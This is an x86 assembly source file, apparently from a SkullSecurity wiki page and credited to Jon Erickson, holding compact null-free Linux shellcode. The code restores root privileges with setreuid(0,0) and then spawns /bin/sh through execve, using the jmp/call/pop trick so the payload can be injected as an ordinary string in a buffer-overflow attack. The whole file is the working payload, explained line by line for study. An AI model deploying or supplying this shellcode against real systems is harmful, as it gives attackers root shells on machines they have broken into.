;https://wiki.skullsecurity.org/index.php?title=Example_4
    ;;;;;;;;
    ; Name: shellcode.asm
    ; Author: Jon Erickson
    ; Date: March 24, 2005
    ; To compile: nasm shellcode.asm
    ; Requires: nasm <http://nasm.sourceforge.net>
    ;
    ; Purpose: This is similar to shellcode.asm except that it
    ; uses more condensed code and some tricks like xor'ing a
    ; variable with itself to eliminate null (00) bytes, which
    ; allows it to be stored in an ordinary string.
    ;;;;;;;;
    BITS 32

    ; setreuid(uid_t ruit, uid_t euid)
    xor eax, eax        ; First eax must be 0 for the next instruction
    mov al, 70          ; Put 70 into eax, since setreuid is syscall #70
    xor ebx, ebx        ; Put 0 into ebx, to set the real uid to root
    xor ecx, ecx        ; Put 0 into ecx, to set the effective uid to root
    int 0x80            ; Call the kernel to make the system call happen

    jmp short two       ; jump down to the bottom to get the address of "/bin/sh"
  one:
    pop ebx             ; pop the "return address" from the stack
                        ; to put the address of the string into ebx
    ; execve(const char *filename, char *const argv [], char *const envp[])
    xor eax, eax        ; Clear eax
    mov [ebx+7], al     ; Put the 0 from eax after the "/bin/sh"
    mov [ebx+8], ebx    ; Put the address of the string from ebx here
    mov [ebx+12], eax   ; Put null here

    mov al, 11          ; execve is syscall #11
    lea ecx, [ebx+8]    ; Load the address that points to /bin/sh
    lea edx, [ebx+12]   ; Load the address where we put null
    int 0x80            ; Call the kernel to make the system call happen

  two:
    call one            ; Use a call to get back to the top to get this
                        ; address
db '/bin/sh'
